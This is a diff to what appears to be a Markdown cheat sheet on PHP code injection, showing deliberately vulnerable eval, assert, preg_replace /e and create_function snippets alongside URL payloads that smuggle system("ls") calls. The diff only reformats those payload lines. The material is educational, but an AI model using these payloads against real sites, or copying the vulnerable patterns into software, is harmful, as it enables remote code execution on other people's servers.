@@ -10,7 +10,7 @@
 ?>
 ```
 
-attack = ?name=";syslem("ls");#
+_[attack]_ = `URL?name=";syslem("ls");#`
 
 ##assert()  - identical to eval()
 ```
@@ -19,7 +19,7 @@ attack = ?name=";syslem("ls");#
   echo "Hello ".htmlentities($_GET['name']);
 ?> 
 ```
-attack = ?name='.system("ls");#
+_[attack]_ = `URL?name='.system("ls");#`
 
 ##preg_replace (with /e modifier) => preg_replace('/.*/e',...) - /e does an eval() on the match
 ```
@@ -27,7 +27,7 @@ attack = ?name='.system("ls");#
     echo preg_replace($_GET["pattern"], $_GET["new"], $_GET["base"]);
 ?>
 ```
-attack = ?pattern=/.*/e&new=system("ls")&base=something
+_[attack]_ = `URL?pattern=/.*/e&new=system("ls")&base=something`
 
 ##create_function
 ```
@@ -35,7 +35,7 @@ attack = ?pattern=/.*/e&new=system("ls")&base=something
    usort($users, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));
 ?>
 ```
-attack = ?order=id);}system('ls');#
+_[attack]_ = `?order=id);}system('ls');#`
 
 include[_once] / require[_once] 
 
